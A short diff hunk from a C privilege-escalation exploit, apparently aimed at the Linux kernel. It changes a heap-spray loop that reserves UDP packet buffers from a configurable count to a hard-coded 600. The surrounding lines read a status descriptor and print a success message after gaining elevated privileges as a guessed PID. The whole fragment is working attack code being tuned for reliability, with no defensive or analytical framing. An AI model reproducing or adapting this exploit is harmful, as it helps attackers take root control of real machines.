@@ -479,11 +479,13 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 					status_cnt = read(status_fd, &buf, 1);
 					if (status_cnt == 0)
 						continue;
-						for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
+
+					for (int i=0; i < 600; i++)
 							{
-								PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
+								PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, 600);
 								alloc_ipv4_udp(1);
 							}
+
 
 					printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);
 
